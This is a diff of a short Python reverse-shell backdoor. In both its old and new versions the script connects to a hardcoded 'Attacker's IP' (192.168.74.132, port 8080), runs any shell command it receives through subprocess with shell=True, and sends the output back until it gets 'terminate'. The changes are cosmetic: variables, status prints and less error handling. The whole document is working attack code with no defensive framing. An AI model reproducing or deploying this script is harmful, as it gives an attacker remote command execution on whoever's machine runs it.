@@ -1,37 +1,39 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 
-import socket           # for building TCP connection
-import subprocess       # To start SHELL in the system
+import socket
+import subprocess
+
+
+ip_addr = "192.168.74.132"
+port = 8080
 
 def connect():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.connect(("192.168.74.132", 8080))   # Attacker's IP and port
-    except Exception as e:
-        print("Connection error:", e)
-        return
 
-    while True:
-        command = s.recv(1024)
-        if not command:
-            break
+            print("[!] Waiting for connection")
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip_addr,port))
+            print("[+] Connected from : ",ip_addr)          
 
-        if b"terminate" in command:
-            s.close()
-            break
-        else:
-            try:
-                CMD = subprocess.Popen(command.decode().strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                output_bytes = CMD.stdout.read()
-                error_bytes = CMD.stderr.read()
-                s.send(output_bytes)
-                s.send(error_bytes)
-            except Exception as e:
-                print("Command execution error:", e)
-                break
+            while True:
+                    
+                    command = s.recv(1024)
+
+                    if not command:
+                            break
+                    if b"terminate" in command:
+                            s.close()
+                            break
+                    else:
+                            CMD = subprocess.Popen(command.decode().strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+                            output_byte = CMD.stdout.read()
+                            error_byte = CMD.stderr.read()
+                            s.send(output_byte)
+                            s.send(error_byte)
+                            # print("Server : ",command)       if you want to what attacker typing enable this command
 
 def main():
-    connect()
+        connect()
 
 if __name__ == "__main__":
-    main()
+        main()
